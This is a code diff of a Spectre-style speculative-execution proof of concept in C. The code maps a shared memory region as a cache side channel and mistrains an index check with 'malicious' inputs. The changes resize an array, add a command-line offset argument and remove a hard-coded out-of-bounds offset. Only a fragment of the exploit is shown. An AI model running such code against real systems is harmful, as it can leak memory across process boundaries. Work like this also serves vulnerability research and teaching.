@@ -21,7 +21,7 @@ Analysis code
 
 uint8_t *array2;
 unsigned int array1_size = 16;
-uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
+uint8_t array1[16] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
 
 const char *lock_file_name = "spectre.lock";
 const char *shared_memory_name = "shared_mem";
@@ -43,11 +43,9 @@ void read_index(size_t index, int tries, int train_rounds, int round_length) {
 		locked = flock(fd_lock, LOCK_EX);
 	}
 
-	/* 
-		 output position to be read
+	/* output position to be read
 		 There are round_length - 1 training inputs 
-		 and 1 malicious input, repeated train_round times
-	*/
+		 and 1 malicious input, repeated train_round times */
 	f = fopen(index_file_name, "w");
 	training_x = tries % array1_size;
 
@@ -86,7 +84,7 @@ void read_index(size_t index, int tries, int train_rounds, int round_length) {
 	}
 }
 
-int main() {
+int main(int argc, const char **argv) {
 	// map share memory area to array2 (cache side channel)
 	int fd = open(shared_memory_name, O_RDONLY);
 	array2 = (uint8_t*)mmap(NULL, 256 * 512, PROT_READ, MAP_SHARED, fd, 0);
@@ -96,14 +94,18 @@ int main() {
 		return 0;
 	}
 
+	remove(lock_file_name);
+
 	int i, best_char, printed = 0;
 	const int no_readings = 5,
 						train_rounds = 4,
 						round_length = 8;
 
-	size_t offset = 18446744073709543208ul;
-	/* size_t offset = 1; */
-	printf("%zu\n", offset);
+	size_t offset = 0;
+	if (argc == 2) {
+		sscanf(argv[1], "%zu", &offset);
+	}
+	printf("Starting from offset %zu\n\n", offset);
 
 	printf("%016lX | ", offset);
 	for (int tries = 0; ; ++tries) {
